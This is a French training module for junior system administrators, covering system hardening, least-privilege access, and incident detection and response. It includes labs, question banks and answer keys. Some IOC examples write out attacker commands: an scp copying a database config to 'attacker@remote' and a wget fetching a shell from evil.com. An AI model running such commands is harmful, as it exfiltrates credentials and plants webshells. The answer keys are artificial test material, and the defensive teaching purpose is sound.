# TOME P3-A — Jour 15 (14h)

## Découpage horaire opérationnel J15
- Durcissement systèmes (Linux + Windows) — **4h**
- Gestion des accès et authentification (principes, moindre privilège, MFA) — **4h**
- Détection et réponse aux incidents de sécurité — **3h**
- Labs incidents sécurité (scénarios réalistes) — **2h**
- Banque de questions + suivi P1 — **1h**

---

## 1) Durcissement systèmes (4h)

### Objectifs d'apprentissage
- Appliquer une politique de durcissement de base sur un serveur Linux et un serveur Windows.
- Identifier et désactiver les services inutiles exposés.
- Configurer un pare-feu hôte minimal (iptables/nftables Linux, Windows Defender Firewall).
- Appliquer les mises à jour de sécurité de façon maîtrisée et documentée.
- Expliquer le concept de surface d'attaque et comment le durcissement la réduit.

### Contenu pédagogique
Le durcissement (hardening) consiste à réduire la surface d'attaque d'un système en supprimant tout ce qui n'est pas strictement nécessaire et en configurant ce qui reste de façon sécurisée.

Points clés:
1. **Surface d'attaque** = ensemble des points d'entrée exploitables (ports ouverts, services, comptes, applications). Plus elle est petite, plus le système est difficile à compromettre.
2. **Principe de base** : désactiver/désinstaller tout ce qui n'est pas utilisé. Chaque service actif est un risque potentiel.
3. **Linux** : `systemctl list-units --type=service` → désactiver les services inutiles ; `ss -tlnp` → lister les ports ouverts ; `iptables`/`nftables` → pare-feu avec politique par défaut DROP ; `unattended-upgrades` → mises à jour automatiques de sécurité.
4. **Windows** : `Get-Service` → auditer les services ; Windows Defender Firewall → bloquer le trafic entrant non sollicité ; Windows Update → appliquer les correctifs critiques ; désactiver SMBv1, NetBIOS si non utilisé.
5. **Checklist de durcissement minimale** : (a) inventaire des services et ports, (b) suppression des services inutiles, (c) pare-feu restrictif, (d) mises à jour, (e) comptes : suppression des comptes inactifs, verrouillage après N tentatives, (f) SSH : désactiver root login, utiliser des clés.
6. **Bonnes pratiques** : toujours tester le durcissement sur un environnement de test avant la production ; documenter chaque modification pour permettre le rollback ; utiliser des baselines de sécurité reconnues (CIS Benchmarks, ANSSI).

### Exercices pratiques (avec corrigés)
1. **Exercice 1 (simple)** : lister les services actifs et les ports ouverts sur ta machine Linux de lab. Proposer la désactivation d'au moins 3 services non essentiels et justifier.
   - **Corrigé détaillé** : `systemctl list-units --type=service --state=running` + `ss -tlnp`. Exemples : cups (impression, inutile sur serveur), avahi-daemon (zero-conf, risque info leakage), bluetooth (inutile sur serveur). Justifier chaque désactivation par l'absence de besoin métier.
2. **Exercice 2 (intermédiaire)** : configurer un pare-feu iptables avec politique par défaut DROP, n'autoriser que SSH (port 22), HTTP (80) et HTTPS (443) en entrée, et tout le trafic sortant. Tester la configuration.
   - **Corrigé détaillé** : `iptables -P INPUT DROP` ; `iptables -A INPUT -p tcp --dport 22 -j ACCEPT` ; `iptables -A INPUT -p tcp --dport 80 -j ACCEPT` ; `iptables -A INPUT -p tcp --dport 443 -j ACCEPT` ; `iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT` ; `iptables -P OUTPUT ACCEPT`. Tester : `curl localhost:80` OK, `nmap` externe ne voit que 22/80/443.
3. **Exercice 3 (avancé)** : rédiger une procédure de durcissement pour un nouveau serveur Linux de production comprenant 10 points de contrôle. Justifier chaque point par le risque qu'il adresse.
   - **Corrigé détaillé** : 1) Désactiver root SSH → empêche brute force root. 2) Authentification par clé SSH uniquement → élimine les attaques par mot de passe. 3) Pare-feu restrictif → limite la surface réseau. 4) Mises à jour automatiques de sécurité → réduit la fenêtre de vulnérabilité. 5) Désactiver les services inutiles → réduit les points d'entrée. 6) Configurer fail2ban → bloque les IP après N échecs. 7) Utiliser sudo avec logs → traçabilité. 8) Désactiver IPv6 si non utilisé → réduit la surface. 9) Partition /tmp en noexec → empêche l'exécution de malwares. 10) Monitoring des logs → détection précoce.

### Nouvelles abréviations rencontrées
- CIS | Center for Internet Security | Organisation produisant des benchmarks de durcissement reconnus | Interagit avec les politiques de sécurité, l'audit, les baselines de configuration
- ANSSI | Agence Nationale de la Sécurité des Systèmes d'Information | Autorité française de cybersécurité | Interagit avec les guides de durcissement, les recommandations OS, la conformité

### Banque de questions du module (15)
1. QCM: le durcissement (hardening) vise à... A) accélérer le système B) réduire la surface d'attaque C) ajouter des fonctionnalités
2. QCM: un service inutilisé doit être... A) laissé actif B) désactivé C) ignoré
3. QCM: la politique par défaut d'un pare-feu restrictif est... A) ACCEPT B) DROP C) FORWARD
4. Ouverte: pourquoi désactiver le login root en SSH ?
5. Ouverte: qu'est-ce que la surface d'attaque d'un système ?
6. Cas: un serveur web a aussi un serveur FTP actif mais non documenté. Action ?
7. QCM: `ss -tlnp` sert à... A) lister les ports en écoute B) supprimer des fichiers C) redémarrer un service
8. Ouverte: pourquoi tester le durcissement avant la production ?
9. Cas: après durcissement, une application legacy ne fonctionne plus. Approche ?
10. QCM: fail2ban sert à... A) bloquer les IP après échecs répétés B) accélérer le réseau C) remplacer le pare-feu
11. Ouverte: différence entre mise à jour de sécurité et mise à jour fonctionnelle.
12. Cas: un pentester trouve 3 ports ouverts inattendus. Priorité ?
13. QCM: un benchmark CIS est... A) un standard de durcissement B) un outil de monitoring C) un langage
14. Ouverte: comment expliquer le durcissement à un développeur ?
15. QCM: résultat attendu du module 1 = A) appliquer des principes de durcissement concrets B) mémoriser des checklists C) ignorer la sécurité

---

## 2) Gestion des accès et authentification (4h)

### Objectifs d'apprentissage
- Appliquer le principe du moindre privilège sur les comptes utilisateurs et services.
- Différencier authentification, autorisation et audit (AAA).
- Configurer et justifier l'usage de MFA/2FA dans un contexte professionnel.
- Gérer les accès temporaires et les révocations de façon traçable.
- Expliquer la différence entre authentification locale et centralisée (AD, LDAP).

### Contenu pédagogique
La gestion des accès est le premier rempart de sécurité. Une identité compromise est la cause #1 des incidents.

Points clés:
1. **AAA** = Authentification (qui tu es), Autorisation (ce que tu peux faire), Audit/Accounting (traçabilité de ce que tu as fait).
2. **Moindre privilège** : chaque utilisateur ou service ne reçoit que les droits strictement nécessaires à sa fonction. Pas de compte admin utilisé au quotidien.
3. **MFA/2FA** : authentification multi-facteurs — combine quelque chose que tu sais (mot de passe) + quelque chose que tu as (téléphone, token) + quelque chose que tu es (biométrie). Rend le vol de mot de passe insuffisant.
4. **Gestion des accès temporaires** : toujours définir une date d'expiration, un périmètre précis, et une procédure de révocation automatique. Ne jamais laisser un accès temporaire devenir permanent.
5. **Authentification centralisée** (AD, LDAP, SSO) : un point unique de gestion des identités. Avantages : révocation immédiate partout, politiques uniformes, audit centralisé. Inconvénient : si le contrôleur est compromis, tout l'accès est compromis.
6. **Comptes de service** : utiliser des comptes dédiés avec le minimum de droits, mots de passe forts et rotation régulière. Jamais de compte utilisateur humain pour un service.
7. **Politique de mots de passe** : longueur minimale (12+ caractères), complexité modérée, rotation raisonnable (90 jours), pas de réutilisation des N derniers, blocage après N tentatives.

### Exercices pratiques (avec corrigés)
1. **Exercice 1 (simple)** : auditer les comptes utilisateurs sur ton système Linux. Identifier les comptes sans mot de passe, les comptes système, et les comptes avec shell de connexion. Proposer des corrections.
   - **Corrigé détaillé** : `cat /etc/passwd` + `cat /etc/shadow` (vérifier comptes sans mot de passe : `!!` ou `*`). `grep -v nologin /etc/passwd` (comptes avec shell). Actions : verrouiller les comptes inactifs (`usermod -L`), changer les shells en `/sbin/nologin` pour les comptes qui ne doivent pas se connecter.
2. **Exercice 2 (intermédiaire)** : configurer sudo pour qu'un utilisateur "support" puisse uniquement redémarrer le service nginx et lire les logs, sans autres droits. Tester et documenter.
   - **Corrigé détaillé** : `visudo` → ajouter `support ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, /usr/bin/journalctl -u nginx`. Tester : `sudo systemctl restart nginx` OK, `sudo systemctl restart apache2` refusé, `sudo su` refusé. Expliquer que cette granularité est le moindre privilège en pratique.
3. **Exercice 3 (avancé)** : concevoir une matrice de droits pour une équipe de 5 personnes (1 admin, 2 développeurs, 2 support) sur un serveur applicatif. Inclure l'accès SSH, sudo, aux logs, à la base de données. Justifier chaque restriction.
   - **Corrigé détaillé** : Admin : SSH + sudo complet + logs + DB admin (besoin de tout pour gérer). Développeurs : SSH restreint + sudo uniquement pour leur application + logs applicatifs + DB read-only (besoin de déployer/débugger, pas de modifier la prod). Support : SSH restreint + sudo uniquement restart services + lecture logs système (besoin de diagnostiquer, pas de modifier le code). Justifier par le moindre privilège adapté à chaque rôle.

### Nouvelles abréviations rencontrées
- AAA | Authentication, Authorization, Accounting | Triade de la gestion des accès | Interagit avec les systèmes d'authentification, les logs, les politiques de sécurité
- MFA | *(déjà existant, section G)* | Authentification multi-facteurs | Interagit avec les comptes, la sécurité des accès, SSO

### Banque de questions du module (15)
1. QCM: AAA signifie... A) Authentification, Autorisation, Audit B) Accès, Alerte, Action C) Administrateur, Application, API
2. QCM: le moindre privilège consiste à donner... A) tous les droits B) le strict nécessaire C) aucun droit
3. QCM: MFA combine au moins... A) 2 mots de passe B) 2 facteurs différents C) 2 utilisateurs
4. Ouverte: pourquoi ne pas utiliser un compte admin comme compte quotidien ?
5. Ouverte: différence entre authentification et autorisation.
6. Cas: un prestataire a besoin d'un accès temporaire de 48h. Procédure ?
7. QCM: un compte de service doit avoir... A) les droits admin B) le minimum de droits nécessaires C) le même mot de passe que l'admin
8. Ouverte: quel est le risque d'un accès temporaire non révoqué ?
9. Cas: un employé quitte l'entreprise. Tous ses accès étaient centralisés AD. Combien de temps pour tout révoquer ?
10. QCM: LDAP est un protocole d'... A) accès à un annuaire B) transfert de fichiers C) streaming vidéo
11. Ouverte: pourquoi la rotation des mots de passe reste-t-elle recommandée ?
12. Cas: mot de passe faible détecté sur un compte de service. Action prioritaire ?
13. QCM: le blocage après N tentatives protège contre... A) le brute force B) le phishing C) les virus
14. Ouverte: comment expliquer le moindre privilège à un manager ?
15. QCM: résultat attendu du module 2 = A) gérer les accès de façon sécurisée et traçable B) donner tous les droits C) ignorer les comptes

---

## 3) Détection et réponse aux incidents de sécurité (3h)

### Objectifs d'apprentissage
- Distinguer un incident de sécurité d'un incident opérationnel classique.
- Appliquer une méthodologie de réponse aux incidents (NIST SP 800-61 : préparation, détection, confinement, éradication, récupération, leçons apprises).
- Analyser des logs pour détecter des signes de compromission (brute force, accès inhabituels, élévation de privilèges).
- Rédiger un rapport d'incident de sécurité factuel et actionnable.

### Contenu pédagogique
Un incident de sécurité n'est pas un simple bug : c'est une violation ou une tentative de violation de la politique de sécurité.

Points clés:
1. **Cycle de vie d'un incident** (NIST) : Préparation → Détection & Analyse → Confinement, Éradication & Récupération → Activité post-incident (leçons apprises).
2. **Détection** : surveiller les logs (auth.log, syslog, Event Viewer), les alertes IDS/IPS, les anomalies de trafic. Indices de compromission (IOC) : tentatives de connexion massives, connexions à des heures inhabituelles, création de comptes inconnus, processus suspects, trafic sortant anormal.
3. **Confinement** : isoler le système compromis sans le détruire (préserver les preuves). Déconnecter du réseau mais ne pas éteindre (la RAM contient des preuves volatiles).
4. **Éradication** : supprimer la cause racine (malware, backdoor, compte compromis). Corriger la vulnérabilité qui a permis l'intrusion.
5. **Récupération** : remettre le système en production proprement, surveiller renforcé pendant une période.
6. **Rapport d'incident** : quoi (nature), quand (timeline), comment (cause), impact (données/systèmes touchés), actions (confinement, correction), prévention (mesures pour que ça ne se reproduise pas).

### Exercices pratiques (avec corrigés)
1. **Exercice 1 (simple)** : analyser un extrait de auth.log montrant 50 tentatives SSH échouées en 2 minutes. Identifier le type d'attaque, proposer le confinement et la prévention.
   - **Corrigé détaillé** : Attaque = brute force SSH. Confinement : bloquer l'IP source (`iptables -A INPUT -s <IP> -j DROP` ou fail2ban). Vérifier si une connexion a réussi parmi les tentatives. Prévention : désactiver auth par mot de passe, utiliser des clés SSH, installer fail2ban.
2. **Exercice 2 (intermédiaire)** : un utilisateur "backup" inconnu apparaît dans /etc/passwd avec UID 0. Classifier l'incident, proposer confinement et éradication.
   - **Corrigé détaillé** : Incident = compromission avec escalade de privilèges (création d'un compte root caché). Confinement immédiat : isoler le serveur du réseau. Éradication : supprimer le compte, auditer tous les comptes et fichiers modifiés récemment (`find / -mtime -1`), vérifier les backdoors (cron, services, clés SSH autorisées), changer tous les mots de passe. Leçons apprises : renforcer le contrôle des créations de comptes, déployer un HIDS.
3. **Exercice 3 (avancé)** : rédiger un rapport d'incident complet pour le scénario "brute force SSH suivi d'une connexion réussie et exfiltration de données". Inclure timeline, impact, actions, recommandations.
   - **Corrigé détaillé** : Rapport structuré : 1) Résumé exécutif (quoi, quand, impact). 2) Timeline précise (première tentative, connexion réussie, exfiltration détectée). 3) Cause racine (mot de passe faible, pas de fail2ban). 4) Impact (données consultées : /etc/shadow, /home/app/config/db.conf → DB compromise). 5) Actions immédiates (isolation, reset mots de passe, rotation clés API, notification). 6) Actions long terme (MFA, clés SSH, fail2ban, audit régulier des auth.log).

### Nouvelles abréviations rencontrées
- NIST | National Institute of Standards and Technology | Institut américain de normalisation (cybersécurité) | Interagit avec les cadres de réponse aux incidents, les standards de sécurité, la conformité
- IOC | Indicator of Compromise | Indice de compromission (artefact indiquant une intrusion) | Interagit avec les logs, le monitoring, la réponse aux incidents
- IDS | Intrusion Detection System | Système de détection d'intrusion | Interagit avec le réseau, les logs, les alertes
- IPS | Intrusion Prevention System | Système de prévention d'intrusion | Interagit avec IDS, le pare-feu, le réseau

### Banque de questions du module (15)
1. QCM: la première phase du cycle NIST est... A) confinement B) préparation C) communication
2. QCM: un IOC est... A) un type de pare-feu B) un indice de compromission C) un langage de script
3. QCM: face à un serveur compromis, la priorité est... A) l'éteindre immédiatement B) l'isoler du réseau sans l'éteindre C) le laisser en ligne
4. Ouverte: pourquoi ne pas éteindre un serveur compromis immédiatement ?
5. Ouverte: différence entre confinement et éradication.
6. Cas: des connexions SSH réussies sont détectées à 3h du matin depuis une IP étrangère. Première action ?
7. QCM: un IDS sert à... A) détecter des intrusions B) bloquer automatiquement C) remplacer le pare-feu
8. Ouverte: que contient un rapport d'incident minimal ?
9. Cas: fail2ban n'a pas bloqué l'attaquant. Pourquoi possiblement ?
10. QCM: la phase "leçons apprises" vise à... A) punir les coupables B) éviter la répétition C) supprimer les logs
11. Ouverte: pourquoi préserver les preuves lors d'un incident ?
12. Cas: des processus inconnus tournent sous l'utilisateur `www-data`. Classification ?
13. QCM: détecter un brute force se fait via... A) les logs d'authentification B) la consommation CPU C) le bruit du ventilateur
14. Ouverte: comment présenter un incident de sécurité à la direction ?
15. QCM: résultat attendu du module 3 = A) détecter et répondre méthodiquement à un incident B) paniquer et tout éteindre C) ignorer les logs

---

## 4) Labs incidents sécurité — scénarios réalistes (2h)

### Objectifs d'apprentissage
- Appliquer le cycle NIST complet sur des scénarios réalistes.
- Corréler des logs multi-sources pour reconstruire une timeline d'attaque.
- Produire un rapport d'incident défendable en contexte professionnel.
- Renforcer les réflexes de réponse sous contrainte temps.

### Contenu pédagogique
Scénarios de lab (environnement simulé ou sur VM de lab) :

1. **Scénario A — Brute force SSH + exfiltration** : un attaquant a bruteforcé SSH, s'est connecté, a exfiltré un fichier de configuration contenant des credentials DB. Tâche : détecter, confiner, éradiquer, documenter.
2. **Scénario B — Élévation de privilèges locale** : un utilisateur standard exploite un sudo mal configuré pour obtenir un shell root. Tâche : identifier l'abus, corriger sudo, auditer les actions root.
3. **Scénario C — Service non sécurisé** : un service web exposé a une faille connue (version obsolète). Un attaquant a déployé un webshell. Tâche : détecter le webshell, confiner, patcher, auditer.

Méthode pour chaque scénario : **timeline → IOC → confinement → éradication → récupération → rapport**.

### Exercices pratiques (avec corrigés)
1. **Exercice 1 (simple)** : scénario A — identifier les IOC dans les logs et proposer le confinement immédiat.
   - **Corrigé détaillé** : IOC dans auth.log : tentatives massives puis "Accepted password for user X from IP Y". IOC dans bash_history : `cat /home/app/config/db.conf`, `scp db.conf attacker@remote:/tmp`. Confinement : bloquer l'IP, couper l'accès réseau de l'utilisateur compromis, vérifier si l'IP est encore active (`ss -tnp`).
2. **Exercice 2 (intermédiaire)** : scénario B — auditer sudo après incident, identifier la règle fautive, la corriger, vérifier qu'aucun autre utilisateur n'a le même privilège.
   - **Corrigé détaillé** : `cat /var/log/auth.log | grep sudo` → trouver la commande exploitée. Vérifier sudoers : `visudo -c` → repérer les règles trop permissives (ex: `ALL=(ALL) NOPASSWD: ALL` au lieu d'une commande spécifique). Corriger avec une règle granulaire. Tester : la commande abusive est refusée. Vérifier tous les utilisateurs dans sudoers.
3. **Exercice 3 (avancé)** : synthèse — rédiger un rapport d'incident complet pour le scénario C, incluant timeline précise, IOC identifiés, actions NIST, recommandations de durcissement.
   - **Corrigé détaillé** : Rapport complet avec sections : (1) Résumé, (2) Timeline, (3) IOC (fichier webshell, logs d'accès suspects, processus inconnu), (4) Confinement (service arrêté, serveur isolé), (5) Éradication (patch version, suppression webshell, reset credentials), (6) Récupération (redéploiement propre, monitoring renforcé), (7) Recommandations (WAF, mise à jour automatique, audit trimestriel).

### Nouvelles abréviations rencontrées
- WAF | Web Application Firewall | Pare-feu applicatif web protégeant contre les attaques HTTP | Interagit avec le serveur web, les logs, les IDS/IPS
- CVE | Common Vulnerabilities and Exposures | Identifiant standard pour une vulnérabilité connue | Interagit avec les bases de données de failles, les correctifs, le scanning

### Banque de questions du module (15)
1. QCM: un lab incident J15 simule... A) un cas réel de compromission B) un exercice sans conséquence C) un cours théorique pur
2. QCM: la première étape face à un incident confirmé est... A) communiquer sur Twitter B) confiner C) ignorer
3. QCM: un webshell est... A) un outil légitime B) un script malveillant déposé sur un serveur web C) un type de pare-feu
4. Ouverte: pourquoi la timeline est-elle cruciale dans un rapport d'incident ?
5. Ouverte: différence entre un IOC et une vulnérabilité.
6. Cas: des logs montrent `wget http://evil.com/shell.php`. Action immédiate ?
7. QCM: CVE signifie... A) Common Vulnerabilities and Exposures B) Central Virus Engine C) Critical Virtual Environment
8. Ouverte: pourquoi ne pas supprimer les logs après un incident ?
9. Cas: le serveur est isolé mais l'attaquant semble toujours actif. Explication possible ?
10. QCM: un rapport d'incident doit être... A) factuel et actionnable B) émotionnel C) vide
11. Ouverte: comment prioriser plusieurs incidents simultanés ?
12. Cas: même type d'incident se reproduit pour la 3e fois. Problème ?
13. QCM: objectif du module 4 = A) réflexes de réponse aux incidents B) mémorisation NIST C) théorie sans pratique
14. Ouverte: comment présenter un incident résolu en entretien ?
15. QCM: résultat attendu = A) réponse méthodique documentée B) panique et reboot C) suppression des preuves

---

## 5) Banque de questions + suivi P1 (1h)

### Objectifs d'apprentissage
- Valider les acquis J15 en format test.
- Transformer J15 en preuve employable immédiate.

### Contenu pédagogique
- 40 min test mixte J15.
- 20 min correction + plan J16.

### Exercices pratiques (avec corrigés)
1. **Exercice 1 (simple)** : rédiger une ligne CV intégrant une compétence sécurité J15.
   - **Corrigé détaillé** : "Application des principes de durcissement et de réponse aux incidents sur serveurs Linux et Windows" ou "Détection et résolution d'incidents de sécurité via analyse de logs et application du cycle NIST".
2. **Exercice 2 (intermédiaire)** : pitch 60s "Pourquoi la sécurité est importante même pour un admin système junior".
   - **Corrigé détaillé** : L'admin a les clés de l'infrastructure → première cible. Un compte admin compromis = toute l'infra compromise. Moindre privilège, durcissement, détection → des réflexes qui protègent l'entreprise au quotidien, pas seulement en cas de crise.
3. **Exercice 3 (avancé)** : plan J16 en 3 priorités mesurables.
   - **Corrigé détaillé** : 1) Comprendre les outils de supervision (Nagios, Zabbix, Prometheus). 2) Mettre en place une sonde basique et interpréter une alerte. 3) Préparer un argumentaire "supervision = proactivité, pas coût".

### Nouvelles abréviations rencontrées
- Aucune nouvelle abréviation technique.

### Banque de questions du module (15)
1. QCM: objectif final J15 = A) compétences sécurité opérationnelles prouvées B) théorie uniquement C) aucun livrable
2. Ouverte: meilleure preuve de compétence sécurité à montrer à un recruteur ?
3. QCM: ligne CV sécurité forte = A) verbe d'action + contexte + impact B) "j'aime la sécurité" C) liste vide
4. Cas: tu as détecté et résolu un incident seul. Comment le valoriser en entretien ?
5. Ouverte: comment relier J15 au poste d'admin système junior ?
6. QCM: plan J16 doit être... A) mesurable B) flou C) optionnel
7. Ouverte: quelle preuve sécurité publier sur le portfolio ce soir ?
8. QCM: la correction immédiate en sécurité sert à... A) ancrer les bons réflexes B) repousser C) copier
9. Cas: le recruteur te demande "Que fais-tu si tu détectes un brute force ?"
10. QCM: preuve solide en sécurité = A) rapport d'incident documenté + logs B) promesse C) absence totale d'incident
11. Ouverte: pourquoi montrer un rapport d'incident (anonymisé) sur ton portfolio ?
12. Cas: "Vous n'avez pas de certification en sécurité, pourquoi vous faire confiance ?"
13. QCM: remédiation utile = A) corriger la lacune précise B) tout recommencer C) abandonner
14. Ouverte: indicateur de progression J15 pertinent ?
15. QCM: résultat P1 réussi = A) portfolio enrichi + CV sécurité B) rien C) théorie sans preuve

---

## Validation qualité J15 (anti-superficiel)

### Livrables obligatoires fin de J15
1. 1 procédure de durcissement Linux documentée (10 points de contrôle, risques adressés).
2. 1 matrice de droits argumentée (admin, dev, support) pour un serveur applicatif.
3. 1 rapport d'incident complet (brute force SSH ou webshell) avec timeline, IOC, actions NIST.
4. 3 labs incidents résolus (brute force, élévation de privilèges, webshell) avec RCA par incident.
5. 1 preuve portfolio (rapport anonymisé ou SOP de durcissement) + mise à jour CV ligne sécurité.

### Grille d'évaluation rapide (100 points)
- Maîtrise du durcissement systèmes (Linux + Windows, pare-feu, services) : **25 pts**
- Gestion des accès (moindre privilège, AAA, MFA, matrices de droits) : **25 pts**
- Détection et réponse aux incidents (cycle NIST, IOC, logs, rapport) : **25 pts**
- Qualité des labs et des rapports (rigueur, traçabilité) : **15 pts**
- Communication technique employabilité : **10 pts**

### Seuil attendu
- **>= 80/100** : J15 validé, passage normal J16.
- **65-79/100** : validé sous remédiation ciblée 24h.
- **< 65/100** : consolidation sécurité requise avant J16.

---

## Corrigés guidés — mode tuteur (réponses attendues)

### A. Corrigé — Module 1 (Durcissement)
1. **B**
2. **B**
3. **B**
4. Pour empêcher les attaques par brute force ciblant root directement, et forcer l'utilisation de sudo pour la traçabilité.
5. Ensemble des points d'entrée exploitables d'un système : ports ouverts, services, comptes utilisateurs, applications exposées.
6. Vérifier si le FTP est utilisé. Si non, le désactiver et documenter. Si oui, le sécuriser (SFTP au lieu de FTP, restreindre les IP sources).
7. **A**
8. Pour éviter de casser un service en production. Un durcissement mal testé peut bloquer une application critique.
9. Identifier le service bloqué via les logs → ajuster la règle de pare-feu ou la configuration durcie pour autoriser le strict nécessaire → re-tester.
10. **A**
11. Mise à jour de sécurité = corrige une vulnérabilité (urgente). Mise à jour fonctionnelle = ajoute/modifie des fonctionnalités (moins urgente).
12. Les fermer immédiatement s'ils ne sont pas nécessaires ; s'ils le sont, les documenter et les sécuriser (restreindre les IP sources, utiliser TLS).
13. **A**
14. "Comme fermer à clé toutes les portes et fenêtres d'une maison, et ne laisser ouvert que ce qui est vraiment nécessaire."
15. **A**

### B. Corrigé — Module 2 (Gestion des accès)
1. **A**
2. **B**
3. **B**
4. Si le compte admin quotidien est compromis (phishing, malware), l'attaquant a tous les droits. Un compte standard limite l'impact.
5. Authentification = prouver son identité (login/mot de passe). Autorisation = ce qu'on a le droit de faire une fois authentifié (lire/écrire/exécuter).
6. Créer un compte dédié, droits limités au périmètre précis, date d'expiration explicite, notification à l'échéance, révocation automatique.
7. **B**
8. L'ancien prestataire (ou un attaquant qui a compromis son compte) conserve un accès non surveillé au système.
9. Immédiatement — via AD, un `Disable-ADAccount` suffit. La centralisation permet une révocation en quelques secondes.
10. **A**
11. Pour limiter la durée d'exploitation d'un mot de passe compromis mais non détecté.
12. Changer le mot de passe immédiatement, vérifier si le compte a été utilisé anormalement (logs), renforcer la politique de mot de passe.
13. **A**
14. "Chaque employé a exactement les accès dont il a besoin pour son travail, rien de plus. Ça limite les dégâts en cas de compte compromis."
15. **A**

### C. Corrigé — Module 3 (Détection et réponse)
1. **B**
2. **B**
3. **B**
4. La RAM contient des preuves volatiles (processus actifs, connexions réseau, clés de chiffrement) qui disparaissent à l'extinction.
5. Confinement = limiter la propagation (isoler le système). Éradication = supprimer la cause racine (malware, backdoor, compte compromis).
6. Confinement immédiat : bloquer l'IP, couper l'accès réseau de l'utilisateur concerné, vérifier ce qui a été fait pendant la session.
7. **A**
8. Date, nature de l'incident, systèmes touchés, actions prises, impact, recommandations.
9. fail2ban mal configuré (seuil trop élevé, temps de bannissement trop court), IP dans une liste blanche, logs non surveillés.
10. **B**
11. Pour une enquête forensique (comprendre ce qui s'est passé), une éventuelle action en justice, et pour auditer l'incident.
12. Compromission probable du service web → élévation de privilèges (exploit du service vers shell). Confiner immédiatement.
13. **A**
14. Résumé factuel : quoi, quand, impact métier, actions prises, mesures pour éviter la répétition. Pas de jargon technique excessif.
15. **A**

### D. Corrigé — Module 4 (Labs incidents)
1. **A**
2. **B**
3. **B**
4. Pour comprendre la séquence exacte des événements, identifier la cause initiale, et estimer la durée de compromission.
5. IOC = preuve qu'une intrusion a eu lieu (fichier suspect, processus inconnu). Vulnérabilité = faiblesse qui pourrait permettre une intrusion (version obsolète, mauvaise config).
6. Confinement : bloquer l'IP source, vérifier si le fichier shell.php a été créé, analyser le fichier, couper l'accès réseau si compromission confirmée.
7. **A**
8. Les logs sont des preuves essentielles pour l'enquête forensique. Leur suppression peut être illégale et empêche de comprendre l'incident.
9. L'attaquant a installé une backdoor persistante (cron, service, clé SSH) qui survit au confinement réseau.
10. **A**
11. Prioriser par impact métier : quels systèmes sont touchés ? Quel est le potentiel de propagation ? Y a-t-il des données sensibles en jeu ?
12. La cause racine n'a pas été traitée — seul le symptôme a été corrigé. Refaire une RCA approfondie.
13. **A**
14. "J'ai détecté un incident via les logs, appliqué le confinement, corrigé la cause racine, et documenté la procédure pour éviter que ça se reproduise."
15. **A**

### E. Corrigé — Module 5 (Banque + P1)
1. **A**
2. Un rapport d'incident documenté (anonymisé) + une SOP de durcissement + la démonstration d'une correction de faille.
3. **A**
4. "J'ai détecté l'incident via les logs, appliqué le cycle NIST, résolu la cause racine, et mis en place des mesures pour éviter la récidive."
5. La sécurité est une responsabilité de l'admin système : durcir les serveurs, gérer les accès, détecter les incidents.
6. **A**
7. Le rapport d'incident anonymisé + la procédure de durcissement à 10 points.
8. **A**
9. "Je bloque l'IP source, vérifie si une connexion a réussi, renforce la config SSH, et documente l'incident."
10. **A**
11. Ça prouve que tu ne fais pas que de la théorie — tu as une méthode de réponse aux incidents applicable en entreprise.
12. "Je n'ai pas encore la certification, mais j'ai appliqué concrètement les principes sur des labs : durcissement, détection d'intrusion, réponse aux incidents. Mes rapports le prouvent."
13. **A**
14. Temps de détection d'un incident simulé + qualité du rapport produit.
15. **A**